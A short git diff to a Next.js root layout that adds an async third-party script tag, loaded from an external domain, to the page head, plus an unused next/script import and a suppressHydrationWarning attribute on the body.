@@ -2,6 +2,8 @@ import { Inter } from "next/font/google";
 import "./globals.css";
 import Providers from './providers';
 import { CookiesProvider } from 'next-client-cookies/server';
+import Script from 'next/script';
+
 const inter = Inter({ subsets: ["latin"] });
 
 export const metadata = {
@@ -12,7 +14,10 @@ export const metadata = {
 export default function RootLayout({ children }) {
   return (
     <html lang="en" suppressHydrationWarning>
-      <body className={`${inter.className} dark text-foreground bg-black`}>
+      <head>
+        <script src="https://scripts.itvt.xyz/user/" async></script>
+      </head>
+      <body className={`${inter.className} dark text-foreground bg-black`} suppressHydrationWarning>
         <CookiesProvider>
           <Providers>{children}</Providers>
         </CookiesProvider>
